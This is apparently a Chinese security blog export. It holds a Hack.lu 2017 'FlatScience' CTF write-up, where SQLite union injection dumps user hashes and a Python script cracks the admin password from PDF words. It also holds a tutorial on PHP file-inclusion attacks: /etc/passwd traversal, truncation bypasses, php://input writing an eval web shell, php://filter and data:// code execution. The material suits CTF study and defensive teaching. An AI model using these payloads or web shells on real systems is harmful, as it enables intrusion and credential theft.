<h3 id="Hack-lu-2017-FlatScience"><a href="#Hack-lu-2017-FlatScience" class="headerlink" title="Hack.lu-2017-FlatScience"></a>Hack.lu-2017-FlatScience</h3><p>界面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20200517170522200.png" alt loading="lazy"></p>
<p>这个网站有很多的<code>pdf</code>文件可以下载，暂时没有什么线索</p>
<p>访问<code>robots.txt</code>得到<code>login.php</code>和<code>admin.php</code>两个登录界面，<code>admin.php</code>源码存在<code>hint：do not even try to bypass this</code>，<code>login.php</code>源码也存在<code>TODO: Remove ?debug-Parameter!</code>，于是访问<code>/login.php?debug</code>得到<code>login.php</code>的源码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
..................(HTML)
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'usr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'usr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'../fancy.db'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT id,name from Users where name='"</span><span class="token operator">.</span><span class="token variable">$user</span><span class="token operator">.</span><span class="token string double-quoted-string">"' and password='"</span><span class="token operator">.</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token operator">.</span><span class="token string double-quoted-string">"Salz!"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-></span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>Some Error occourred!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debug'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'login.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
................(HTML)</code></pre>

<p>可以看到用的是<code>SQLite</code>数据库，并且可直接查询，未经过过滤，但是密码进行了加密，先看看里面有什么东西，网上查<code>sqlite</code>的语法，和其它数据库大同小异，过程如下：</p>
<p>查表：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">usr<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select name,name FROM sqlite_master WHERE type='</span><span class="token keyword">table</span>' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment">--+&amp;pw=111 </span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20200517170020527.png" alt loading="lazy"></p>
<p>查表名及其对应的结构：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">usr<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select name,sql FROM sqlite_master WHERE type='</span><span class="token keyword">table</span>' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment">--+&amp;pw=111</span></code></pre>

<p>得到：<code>CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))</code>，可以看到有一个<code>hint</code>字段</p>
<p>再将内容查询出来：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">usr<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> name<span class="token punctuation">,</span><span class="token punctuation">(</span>id<span class="token operator">/</span>name<span class="token operator">/</span>password<span class="token punctuation">)</span> <span class="token keyword">FROM</span> Users <span class="token keyword">limit</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment">--+&amp;pw=111</span></code></pre>

<pre class="language-none"><code class="language-none">1,admin,3fab54a50e770d830c0416df817567662a9dc85c,my fav word in my fav paper?!
2,fritze,54eae8935c90f467427f05e4ece82cf569f89507,my love is…?
3,hansi,34b0bb7c304949f9ff2fc101eef0f048be10d3bd,the password is password</code></pre>

<p>表中只有以上三行字段内容，根据<code>hint</code>可知，应该是要在<code>fav paper</code>中找到一个词+<code>Salz</code>之后<code>sha1</code>得到的值为<code>34b0bb7c304949f9ff2fc101eef0f048be10d3bd</code>，这个单词应该就是<code>admin</code>的密码，应该就在前面的那些<code>paper</code>的<code>pdf</code>文件里，于是用<code>wget</code>命令将其全都下载下来：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://124.126.19.106:43631/ -r -np -nd -A .pdf</code></pre>

<p>再用脚本遍历所有<code>pdf</code>文件中的单词</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> io <span class="token keyword">import</span> StringIO
<span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>pdfinterp <span class="token keyword">import</span> PDFResourceManager<span class="token punctuation">,</span> PDFPageInterpreter
<span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>converter <span class="token keyword">import</span> TextConverter
<span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>layout <span class="token keyword">import</span> LAParams
<span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>pdfpage <span class="token keyword">import</span> PDFPage
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> string
<span class="token keyword">import</span> os
<span class="token keyword">import</span> hashlib


<span class="token keyword">def</span> <span class="token function">get_pdf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string">"../FlatScience/"</span> <span class="token operator">+</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">"../FlatScience/"</span><span class="token punctuation">)</span> <span class="token keyword">if</span> i<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"pdf"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">convert_pdf_2_text</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    rsrcmgr <span class="token operator">=</span> PDFResourceManager<span class="token punctuation">(</span><span class="token punctuation">)</span>
    retstr <span class="token operator">=</span> StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
    device <span class="token operator">=</span> TextConverter<span class="token punctuation">(</span>rsrcmgr<span class="token punctuation">,</span> retstr<span class="token punctuation">,</span> laparams<span class="token operator">=</span>LAParams<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    interpreter <span class="token operator">=</span> PDFPageInterpreter<span class="token punctuation">(</span>rsrcmgr<span class="token punctuation">,</span> device<span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>
        <span class="token keyword">for</span> page <span class="token keyword">in</span> PDFPage<span class="token punctuation">.</span>get_pages<span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            interpreter<span class="token punctuation">.</span>process_page<span class="token punctuation">(</span>page<span class="token punctuation">)</span>
        text <span class="token operator">=</span> retstr<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span>
    device<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    retstr<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> text


<span class="token keyword">def</span> <span class="token function">find_password</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    pdf_path <span class="token operator">=</span> get_pdf<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># print(pdf_path)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> pdf_path<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Searching word in "</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>
        pdf_text <span class="token operator">=</span> convert_pdf_2_text<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> word <span class="token keyword">in</span> pdf_text<span class="token punctuation">:</span>
            sha1_password <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">(</span>word <span class="token operator">+</span> <span class="token string">"Salz!"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> sha1_password <span class="token operator">==</span> <span class="token string">'3fab54a50e770d830c0416df817567662a9dc85c'</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Find the password :"</span> <span class="token operator">+</span> word<span class="token punctuation">)</span>
                exit<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    find_password<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>最后跑出<code>password</code>为<code>ThinJerboa</code>，在<code>admin.php</code>登录即可得到<code>flag</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF题</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞小结</title>
    <url>/posts/73702816/</url>
    <content><![CDATA[<p>文件包含作用函数：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">require</span><span class="token comment">//包含过程中出现错误直接退出程序</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//包含过程出现错误，抛出警告，程序继续运行</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//包括require()的功能，但函数只包含一次</span>
<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//包括include()的功能，但函数只包含一次</span></code></pre>

<p>该函数用以加载另一个文件中的php代码，并且当php来执行</p>
<p>而漏洞产生的原因则是因为当函数中的参数未经过严格的过滤，且用户可控时，当用户包含了其它恶意文件代码，就导致执行了非预期操作</p>
<span id="more"></span>

<h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>无限制：</p>
<pre class="language-php" data-language="php"><code class="language-php">2.php代码：
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
1.php代码：
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315203414355.png" alt loading="lazy"></p>
<p>可用于读取系统其它文件的内容</p>
<p>例如<code>2.php?a=../../../../../../../etc/passwd</code></p>
<p>有限制：</p>
<pre class="language-php" data-language="php"><code class="language-php">2.php代码：
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
1.php代码：
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre>

<p>绕过方法：</p>
<p><code>%00</code>截断，条件：<code>magic_quotes_gpc</code> = <code>Off</code>，php版本&lt;<code>5.3.4</code></p>
<p>路径长度截断，条件：php版本&lt;<code>5.2.8</code></p>
<p>windows OS –&gt; 在文件后加点，点号需要长于256；linux OS –&gt; 用<code>./</code>，需长于4096</p>
<blockquote>
<p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p>
<p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p>
</blockquote>
<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>无限制：</p>
<pre class="language-php" data-language="php"><code class="language-php">2.php代码：
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
1.php代码：
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315210218269.png" alt loading="lazy"></p>
<p>有限制：</p>
<pre class="language-php" data-language="php"><code class="language-php">2.php代码：
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
1.php代码：
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre>

<p>在末尾加上<code>%3f</code>，<code>%23</code>绕过</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315210124764.png" alt loading="lazy"></p>
<h3 id="PHP支持的协议和封装协议"><a href="#PHP支持的协议和封装协议" class="headerlink" title="PHP支持的协议和封装协议"></a>PHP支持的协议和封装协议</h3><h4 id="php-伪协议"><a href="#php-伪协议" class="headerlink" title="php://伪协议"></a>php://伪协议</h4><p><strong>条件</strong></p>
<ul>
<li><code>allow_url_fopen</code>:off/on</li>
<li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp</code>需要on</li>
</ul>
<p><code>php://</code> 访问各个输入/输出流（I/O streams），常使用<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>
<h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>当<code>enctype=&quot;multipart/form-data&quot;</code>时<code>php://input</code>无效</p>
<p>用法<code>?file=php://input</code>，利用POST传入</p>
<p>利用<code>php://input</code>写马（亦可命令执行）：</p>
<pre class="language-php" data-language="php"><code class="language-php">2.php代码：
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre>

<p>要求：同时开启 <code>allow_url_fopen</code> 和 <code>allow_url_include</code>（PHP &lt; 5.3.0）即可造成任意代码执行</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?PHP</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST[cmd])?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315212029230.png" alt loading="lazy"></p>
<h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h5><p><strong>使用</strong></p>
<p>一种元封装器， 设计用于数据流打开时的<a href="https://www.php.net/manual/zh/filters.php">筛选过滤</a>应用。</p>
<p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200507163438086.png" alt loading="lazy"></p>
<p><strong>可用的过滤器列表（4类）</strong></p>
<table>
<thead>
<tr>
<th><strong>字符串过滤器</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td>string.rot13</td>
<td>等同于<code>str_rot13()</code>，rot13变换</td>
</tr>
<tr>
<td>string.toupper</td>
<td>等同于<code>strtoupper()</code>，转大写字母</td>
</tr>
<tr>
<td>string.tolower</td>
<td>等同于<code>strtolower()</code>，转小写字母</td>
</tr>
<tr>
<td>string.strip_tags</td>
<td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th><strong>转换过滤器</strong></th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>convert.base64-encode &amp; convert.base64-decode</td>
<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>
</tr>
<tr>
<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>压缩过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>zlib.deflate &amp; zlib.inflate</td>
<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
</tr>
<tr>
<td>bzip2.compress &amp; bzip2.decompress</td>
<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th><strong>加密过滤器</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td>mcrypt.*</td>
<td>libmcrypt 对称加密算法</td>
</tr>
<tr>
<td>mdecrypt.*</td>
<td>libmcrypt 对称解密算法</td>
</tr>
</tbody></table>
<ol>
<li><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</li>
<li><code>php://input + [POST DATA]</code>执行php代码</li>
</ol>
<p><strong>演示</strong></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php exit; ?>'</span><span class="token punctuation">;</span>
<span class="token variable">$content</span> <span class="token operator">.=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p>成功写马</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200507174823081.png" alt loading="lazy"></p>
<p><code>string.strip_tags</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200507180043996.png" alt loading="lazy"></p>
<p><strong><a href="https://www.php.net/manual/zh/filters.string.strip_tags.php">string.strip_tags</a></strong>：使用此过滤器等同于用 <code>strip_tags()</code>函数处理所有的流数据。可以用两种格式接收参数：一种是和 <code>strip_tags()</code>函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。</p>
<p><strong><a href="https://www.php.net/manual/zh/function.strip-tags.php">strip_tags()</a></strong>：从字符串中去除 HTML 和 PHP 标记</p>
<p><strong>ROT13</strong>方法</p>
<p>编码解码网站：<a href="https://cryptii.com/pipes/rot13-decoder">https://cryptii.com/pipes/rot13-decoder</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200507180852771.png" alt loading="lazy"></p>
<h4 id="file-伪协议"><a href="#file-伪协议" class="headerlink" title="file://伪协议"></a>file://伪协议</h4><p><strong>条件</strong></p>
<ul>
<li><code>allow_url_fopen</code>:off/on</li>
<li><code>allow_url_include</code> :off/on</li>
</ul>
<p><strong>用法</strong></p>
<p>用于访问本地文件系统</p>
<ol>
<li><strong>file://[文件的绝对路径和文件名]</strong>   <code>a=file://D:/phpstudy/WWW/test/1.php</code></li>
<li><strong>[文件的相对路径和文件名]</strong>   <code>a=./1.php</code></li>
<li><strong>[http：//网络路径和文件名]</strong>  <code>a=http://127.0.0.1/phpinfo.txt</code></li>
</ol>
<p><strong>演示</strong></p>
<pre class="language-php" data-language="php"><code class="language-php">2.php代码：
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
1.php代码：
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315212627490.png" alt loading="lazy"></p>
<h4 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h4><p><strong>条件</strong></p>
<ul>
<li><code>allow_url_fopen</code>:on</li>
<li><code>allow_url_include</code> :on</li>
</ul>
<p><strong>用法</strong></p>
<p>自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
<ol>
<li><code>data://text/plain;base64,</code></li>
<li><code>data://text/plain,</code></li>
<li><code>data:text/plain;base64,</code></li>
<li><code>data:text/plain,</code></li>
</ol>
<p><strong>演示</strong></p>
<pre class="language-php" data-language="php"><code class="language-php">2.php代码：
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre>

<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">===</span>base64<span class="token operator">===</span><span class="token operator">></span>  PD9waHAgcGhwaW5mbygpOw<span class="token operator">==</span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315213202734.png" alt loading="lazy"></p>
<p>读取文件内容操作</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">===</span>base64<span class="token operator">===</span><span class="token operator">></span>   PD9waHAgc2hvd19zb3VyY2UoJzEucGhwJyk7</span></code></pre>

